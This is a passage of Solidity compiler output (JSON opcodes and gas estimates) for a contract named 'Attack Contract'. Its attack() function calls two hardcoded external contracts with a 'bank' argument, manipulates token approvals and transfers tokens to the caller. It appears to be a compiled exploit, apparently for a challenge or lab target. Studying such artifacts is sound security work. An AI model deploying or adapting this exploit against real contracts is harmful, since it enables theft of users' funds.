					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x5 DUP1 SLOAD PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB NOT SWAP1 DUP2 AND PUSH20 0x94251C982CB00B1B1E1707D61553E304289D4D8 OR SWAP1 SWAP2 SSTORE PUSH1 0x6 DUP1 SLOAD SWAP1 SWAP2 AND PUSH20 0x550714E1FD747084FC5CB2B2E3A93512972AEBDA OR SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH3 0x59 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0xF DUP2 MSTORE PUSH32 0x41747461636B20436F6E74726163740000000000000000000000000000000000 PUSH1 0x20 DUP1 DUP4 ADD SWAP2 DUP3 MSTORE DUP4 MLOAD DUP1 DUP6 ADD SWAP1 SWAP5 MSTORE PUSH1 0x2 DUP5 MSTORE PUSH32 0x4143000000000000000000000000000000000000000000000000000000000000 SWAP1 DUP5 ADD MSTORE DUP2 MLOAD SWAP2 SWAP3 SWAP2 PUSH3 0xD4 SWAP2 PUSH1 0x3 SWAP2 PUSH3 0x252 JUMP JUMPDEST POP DUP1 MLOAD PUSH3 0xEA SWAP1 PUSH1 0x4 SWAP1 PUSH1 0x20 DUP5 ADD SWAP1 PUSH3 0x252 JUMP JUMPDEST POP POP POP PUSH3 0x117 ADDRESS PUSH15 0x13426172C74D822B878FE800000000 PUSH3 0x11D PUSH5 0x100000000 MUL PUSH5 0x100000000 SWAP1 DIV JUMP JUMPDEST PUSH3 0x38E JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP3 AND PUSH3 0x192 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x1A9 PUSH1 0x0 DUP4 DUP4 PUSH5 0x100000000 PUSH3 0x24D DUP2 MUL DIV JUMP JUMPDEST DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH3 0x1BD SWAP2 SWAP1 PUSH3 0x2F8 JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 DUP2 KECCAK256 DUP1 SLOAD DUP4 SWAP3 SWAP1 PUSH3 0x1EC SWAP1 DUP5 SWAP1 PUSH3 0x2F8 JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x40 MLOAD DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP4 AND SWAP1 PUSH1 0x0 SWAP1 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP1 PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH3 0x249 PUSH1 0x0 DUP4 DUP4 PUSH5 0x100000000 PUSH3 0x24D DUP2 MUL DIV JUMP JUMPDEST POP POP JUMP JUMPDEST POP POP POP JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH3 0x260 SWAP1 PUSH3 0x338 JUMP JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH3 0x284 JUMPI PUSH1 0x0 DUP6 SSTORE PUSH3 0x2CF JUMP JUMPDEST DUP3 PUSH1 0x1F LT PUSH3 0x29F JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x2CF JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x2CF JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x2CF JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x2B2 JUMP JUMPDEST POP PUSH3 0x2DD SWAP3 SWAP2 POP PUSH3 0x2E1 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x2DD JUMPI PUSH1 0x0 DUP2 SSTORE PUSH1 0x1 ADD PUSH3 0x2E2 JUMP JUMPDEST PUSH1 0x0 DUP3 NOT DUP3 GT ISZERO PUSH3 0x333 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP ADD SWAP1 JUMP JUMPDEST PUSH1 0x2 DUP2 DIV PUSH1 0x1 DUP3 AND DUP1 PUSH3 0x34D JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH3 0x388 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xC8F DUP1 PUSH3 0x39E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xD1 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV DUP1 PUSH4 0x70A08231 GT PUSH2 0x8E JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x15E JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x187 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x18F JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x199 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x1AC JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x1BF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xD6 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0xF4 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x117 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x129 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x13C JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x14B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xDE PUSH2 0x1D2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xEB SWAP2 SWAP1 PUSH2 0xB71 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x107 PUSH2 0x102 CALLDATASIZE PUSH1 0x4 PUSH2 0xB25 JUMP JUMPDEST PUSH2 0x264 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xEB JUMP JUMPDEST PUSH1 0x2 SLOAD JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xEB JUMP JUMPDEST PUSH2 0x107 PUSH2 0x137 CALLDATASIZE PUSH1 0x4 PUSH2 0xAE9 JUMP JUMPDEST PUSH2 0x27C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xEB JUMP JUMPDEST PUSH2 0x107 PUSH2 0x159 CALLDATASIZE PUSH1 0x4 PUSH2 0xB25 JUMP JUMPDEST PUSH2 0x2A0 JUMP JUMPDEST PUSH2 0x11B PUSH2 0x16C CALLDATASIZE PUSH1 0x4 PUSH2 0xA94 JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0xDE PUSH2 0x2C2 JUMP JUMPDEST PUSH2 0x197 PUSH2 0x2D1 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x107 PUSH2 0x1A7 CALLDATASIZE PUSH1 0x4 PUSH2 0xB25 JUMP JUMPDEST PUSH2 0x5A9 JUMP JUMPDEST PUSH2 0x107 PUSH2 0x1BA CALLDATASIZE PUSH1 0x4 PUSH2 0xB25 JUMP JUMPDEST PUSH2 0x644 JUMP JUMPDEST PUSH2 0x11B PUSH2 0x1CD CALLDATASIZE PUSH1 0x4 PUSH2 0xAB6 JUMP JUMPDEST PUSH2 0x652 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH2 0x1E1 SWAP1 PUSH2 0xC05 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x20D SWAP1 PUSH2 0xC05 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x25A JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x22F JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x25A JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x23D JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x272 DUP2 DUP6 DUP6 PUSH2 0x67D JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x28A DUP6 DUP3 DUP6 PUSH2 0x7DB JUMP JUMPDEST PUSH2 0x295 DUP6 DUP6 DUP6 PUSH2 0x858 JUMP JUMPDEST POP PUSH1 0x1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x272 DUP2 DUP6 DUP6 PUSH2 0x2B3 DUP4 DUP4 PUSH2 0x652 JUMP JUMPDEST PUSH2 0x2BD SWAP2 SWAP1 PUSH2 0xBC6 JUMP JUMPDEST PUSH2 0x67D JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH2 0x1E1 SWAP1 PUSH2 0xC05 JUMP JUMPDEST PUSH1 0x5 SLOAD PUSH1 0x40 MLOAD PUSH32 0xC994BC8600000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0xC994BC86 SWAP1 PUSH2 0x34A SWAP1 PUSH1 0x4 ADD PUSH1 0x20 DUP1 DUP3 MSTORE PUSH1 0x4 SWAP1 DUP3 ADD MSTORE PUSH32 0x62616E6B00000000000000000000000000000000000000000000000000000000 PUSH1 0x40 DUP3 ADD MSTORE PUSH1 0x60 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x364 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x378 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x6 SLOAD PUSH1 0x40 MLOAD PUSH32 0x77BF51A00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB SWAP1 SWAP2 AND SWAP3 POP PUSH4 0x77BF51A SWAP2 POP PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3DA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3EE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x6 SLOAD PUSH1 0x40 MLOAD PUSH32 0x8CBA468600000000000000000000000000000000000000000000000000000000 DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB SWAP1 SWAP2 AND SWAP3 POP PUSH4 0x8CBA4686 SWAP2 POP PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x450 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x464 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x6 SLOAD PUSH2 0x485 SWAP3 POP ADDRESS SWAP2 POP PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB AND PUSH5 0xE8D4A51000 PUSH2 0x67D JUMP JUMPDEST PUSH1 0x6 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB AND PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB AND PUSH4 0xF99A1F30 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4F1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x505 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x5 SLOAD PUSH1 0x40 MLOAD PUSH32 0xA9059CBB00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB SWAP1 SWAP2 AND SWAP3 POP PUSH4 0xA9059CBB SWAP2 POP PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x56E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x582 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x5A6 SWAP2 SWAP1 PUSH2 0xB4F JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER DUP2 PUSH2 0x5B7 DUP3 DUP7 PUSH2 0x652 JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x637 JUMPI PUSH1 0x40 MLOAD PUSH1 0xE5 PUSH1 0x2 EXP PUSH3 0x461BCD MUL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A2064656372656173656420616C6C6F77616E63652062656C6F77 PUSH1 0x44 DUP3 ADD MSTORE PUSH32 0x207A65726F000000000000000000000000000000000000000000000000000000 PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x295 DUP3 DUP7 DUP7 DUP5 SUB PUSH2 0x67D JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x272 DUP2 DUP6 DUP6 PUSH2 0x858 JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB SWAP2 DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP4 AND PUSH2 0x6FB JUMPI PUSH1 0x40 MLOAD PUSH1 0xE5 PUSH1 0x2 EXP PUSH3 0x461BCD MUL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP1 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F76652066726F6D20746865207A65726F20616464 PUSH1 0x44 DUP3 ADD MSTORE PUSH32 0x7265737300000000000000000000000000000000000000000000000000000000 PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x62E JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP3 AND PUSH2 0x77A JUMPI PUSH1 0x40 MLOAD PUSH1 0xE5 PUSH1 0x2 EXP PUSH3 0x461BCD MUL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x22 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F766520746F20746865207A65726F206164647265 PUSH1 0x44 DUP3 ADD MSTORE PUSH32 0x7373000000000000000000000000000000000000000000000000000000000000 PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x62E JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP4 DUP2 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x7E7 DUP5 DUP5 PUSH2 0x652 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 NOT DUP2 EQ PUSH2 0x852 JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x845 JUMPI PUSH1 0x40 MLOAD PUSH1 0xE5 PUSH1 0x2 EXP PUSH3 0x461BCD MUL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20696E73756666696369656E7420616C6C6F77616E6365000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x62E JUMP JUMPDEST PUSH2 0x852 DUP5 DUP5 DUP5 DUP5 SUB PUSH2 0x67D JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP4 AND PUSH2 0x8D7 JUMPI PUSH1 0x40 MLOAD PUSH1 0xE5 PUSH1 0x2 EXP PUSH3 0x461BCD MUL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E736665722066726F6D20746865207A65726F206164 PUSH1 0x44 DUP3 ADD MSTORE PUSH32 0x6472657373000000000000000000000000000000000000000000000000000000 PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x62E JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP3 AND PUSH2 0x956 JUMPI PUSH1 0x40 MLOAD PUSH1 0xE5 PUSH1 0x2 EXP PUSH3 0x461BCD MUL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x23 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220746F20746865207A65726F2061646472 PUSH1 0x44 DUP3 ADD MSTORE PUSH32 0x6573730000000000000000000000000000000000000000000000000000000000 PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x62E JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 DUP2 LT ISZERO PUSH2 0x9E8 JUMPI PUSH1 0x40 MLOAD PUSH1 0xE5 PUSH1 0x2 EXP PUSH3 0x461BCD MUL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220616D6F756E7420657863656564732062 PUSH1 0x44 DUP3 ADD MSTORE PUSH32 0x616C616E63650000000000000000000000000000000000000000000000000000 PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x62E JUMP JUMPDEST PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 DUP6 DUP6 SUB SWAP1 SSTORE SWAP2 DUP6 AND DUP2 MSTORE SWAP1 DUP2 KECCAK256 DUP1 SLOAD DUP5 SWAP3 SWAP1 PUSH2 0xA1F SWAP1 DUP5 SWAP1 PUSH2 0xBC6 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP3 PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB AND DUP5 PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP5 PUSH1 0x40 MLOAD PUSH2 0xA6B SWAP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 0x852 JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB DUP2 AND DUP2 EQ PUSH2 0xA8F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xAA6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xAAF DUP3 PUSH2 0xA78 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xAC9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xAD2 DUP4 PUSH2 0xA78 JUMP JUMPDEST SWAP2 POP PUSH2 0xAE0 PUSH1 0x20 DUP5 ADD PUSH2 0xA78 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xAFE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB07 DUP5 PUSH2 0xA78 JUMP JUMPDEST SWAP3 POP PUSH2 0xB15 PUSH1 0x20 DUP6 ADD PUSH2 0xA78 JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xB38 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB41 DUP4 PUSH2 0xA78 JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xB61 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0xAAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0xB9E JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0x40 ADD MSTORE DUP3 ADD PUSH2 0xB82 JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 0xBB0 JUMPI PUSH1 0x0 PUSH1 0x40 DUP4 DUP8 ADD ADD MSTORE JUMPDEST POP PUSH1 0x1F ADD PUSH1 0x1F NOT AND SWAP3 SWAP1 SWAP3 ADD PUSH1 0x40 ADD SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 NOT DUP3 GT ISZERO PUSH2 0xC00 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP ADD SWAP1 JUMP JUMPDEST PUSH1 0x2 DUP2 DIV PUSH1 0x1 DUP3 AND DUP1 PUSH2 0xC19 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH2 0xC53 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SMOD DUP9 0x4B PUSH21 0x7E73521D137CBFDBE4C823B04341C3AAFBCE4161E4 0xC7 JUMPDEST BASEFEE 0xC5 MSIZE 0xA7 0xDC PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "643000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"allowance(address,address)": "infinite",
						"approve(address,uint256)": "22757",
						"attack()": "infinite",
						"balanceOf(address)": "759",
						"decimals()": "271",
						"decreaseAllowance(address,uint256)": "23306",
						"increaseAllowance(address,uint256)": "23379",
						"name()": "infinite",
						"symbol()": "infinite",
						"totalSupply()": "431",
						"transfer(address,uint256)": "43674",
						"transferFrom(address,address,uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
